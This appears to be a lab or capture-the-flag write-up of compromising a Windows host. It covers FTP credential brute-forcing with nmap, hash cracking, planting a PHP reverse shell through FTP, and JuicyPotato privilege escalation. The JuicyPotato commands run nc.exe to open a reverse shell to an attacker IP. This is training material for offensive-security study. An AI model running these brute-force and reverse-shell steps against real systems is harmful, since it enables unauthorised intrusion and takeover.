## Recon
![[Pasted image 20260704215308.png]]

##### FTP
Trying to read the file on ftp, but it access denied
![[Pasted image 20260705112255.png]]

#### Web Service
On web page, required username and password
![[Pasted image 20260705112538.png]]

#### Rabbit Hole
I'm stuck on looking CVE for the web service since tech they used is (Win32) PHP/5.3.8 and Apache/2.2.21
### Foothold
#### FTP
Bruteforce ftp using nmap
```bash
$ nmap -p 21 --script ftp-brute 192.168.165.46
```

![[Pasted image 20260705115209.png]]

Got creds web
![[Pasted image 20260705115245.png]]

get hash type first, then brute it using hashcat
![[Pasted image 20260705115334.png]]
![[Pasted image 20260705115343.png]]

Using creds we got, now we can access the web
![[Pasted image 20260705115505.png]]

#### Revshell
Since we got write permission on ftp of the web service, we can store revshell on the server through FTP. Using revshell "PHP Ivan Sincek"
![[Pasted image 20260705120003.png]]

Got revshell
![[Pasted image 20260705120050.png]]
![[Pasted image 20260705120148.png]]

## Privilege Escalation

Another Potato?
![[Pasted image 20260705120251.png]]

Try every potato on this machine
![[Pasted image 20260705141256.png]]
Based on the output, only JuicyPotato that show the output, so it should be the solution for this

Failed, when trying to default csid
```cmd
C:\> .\JuicyPotatox86.exe -l 1377 -p c:\\windows\\system32\\cmd.exe -a "/c C:\\Users\\apache\\Desktop\\nc.exe -e cmd.exe 192.168.45.208 4443" -t *
```

![[Pasted image 20260705141411.png]]

Resolve this error by inputting a random CLSD from https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
```bash
C:\> .\JuicyPotatox86.exe -l 1377 -p c:\\windows\\system32\\cmd.exe -a "/c C:\\Users\\apache\\Desktop\\nc.exe -e cmd.exe 192.168.45.208 4443" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

![[Pasted image 20260705141816.png]]

Got Admin
![[Pasted image 20260705133310.png]]

## What I Learned
1. **If you get FTP of the web serivce, you can store revshell on FTP then access it through the website**
2. **Try to bruteforce the FTP creds**
3. **If the tools didn't show the output (Potato case), probably won't work. Find other potato that return the output**
